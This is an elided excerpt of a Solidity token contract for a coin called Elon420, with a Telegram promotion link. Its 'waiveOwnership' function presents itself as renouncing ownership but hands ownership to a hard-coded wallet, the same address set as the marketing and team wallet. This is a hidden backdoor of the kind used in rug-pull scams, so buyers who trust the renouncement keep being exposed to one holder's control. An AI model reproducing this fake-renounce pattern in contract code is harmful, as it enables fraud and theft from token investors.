...
Telegram: https://t.me/Elon420BscPortal
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x95c1502618926ee2Fb5aa5916C606a02B2Bc08ea);
    }
...
contract Elon420 is Context, IERC20, Ownable {
    ...
    string private _name = "Elon420";
    string private _symbol = "ELON420";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x95c1502618926ee2Fb5aa5916C606a02B2Bc08ea);
    address payable private teamWalletAddress = payable(0x95c1502618926ee2Fb5aa5916C606a02B2Bc08ea);
